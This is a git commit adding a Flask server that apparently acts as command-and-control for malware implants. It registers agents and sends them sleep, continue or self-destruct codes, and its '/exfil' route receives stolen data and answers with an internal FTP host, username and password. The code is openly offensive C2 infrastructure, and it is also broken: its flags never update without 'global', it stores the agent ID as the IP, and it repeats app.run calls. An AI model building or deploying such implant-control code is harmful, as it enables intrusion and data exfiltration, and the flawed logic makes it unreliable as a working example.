68239d3c46a7dd4ad209fb36464a5305f1c5d24f
ehsu4220 <31673535+ehsu4220@users.noreply.github.com>
2023-05-12 22:29:14 -0400

    flask server to communicate with agents

---
+++ server_listener.py
@@ -0,0 +1,81 @@
+from flask import Flask, request, make_response
+
+app = Flask(__name__)
+
+# Dictionary to hold agent sessions
+agents = {}
+
+# Manually triggered post requests
+data_found = False
+kill_implants = False
+
+# Manual commands sent by user
+## Manually send post to initialize self-destruct
+@app.route('/manual_kill', methods=['POST'])
+def self_destruct():
+    data = request.json
+    kill_implants = True
+    return make_response(1)
+
+## Manually send post to indicate that data is incorrect
+@app.route('/manual_badData', methods=['POST'])
+def cleared_data():
+    data = request.json
+    data_found = False
+    return make_response(1)
+
+
+# Route to register a new agent session
+@app.route('/register', methods=['POST'])
+def register():
+    data = request.json
+    agent_id = data['agent_id']
+    command = data['command']
+    agent_ip = data['ip']
+    agent_port = data['port']
+    agents[agent_id] = {'agent_id': agent_id,
+                            'command' : command,
+                            'ip' : agent_id,
+                            'port' : agent_port}
+    return make_response(1)
+
+# Route to receive commands from an agent
+@app.route('/command', methods=['POST'])
+def command():
+    # Send a command to a session
+    data = request.json
+    agent_id = data['agent_id']
+    # Send the command to the agent associated with the session ID
+    if agent_id in agents.keys():
+
+        # Send the command to the agent here...
+        # Can assign commands to numbers, i.e.,
+        ## 0 - sleep
+        ## 1 - continue
+        ## 2 - self-destruct
+        if data_found:
+            response = make_response({'cmd' : 0})
+        elif kill_implants:
+            response = make_response({'cmd' : 2})
+        else:
+            response = make_response({ 'cmd' : 1})
+    
+    return response
+
+# Route to receive exfiltrated data from an agent
+@app.route('/exfil', methods=['POST'])
+def exfil():
+    data = request.json
+    agent_id = data['agent_id']
+    if agent_id in agents:
+        data_found = True
+        response = make_response({'host' : '192.168.68.128',
+                                  'username' : 'ftpwebuser',
+                                  'password' : 'password'})
+
+    return response
+
+if __name__ == '__main__':
+    app.run(debug=True, host='0.0.0.0', port=8080)
+    app.run(debug=True, host='0.0.0.0', port=20)
+    app.run(debug=True, host='0.0.0.0', port=21)
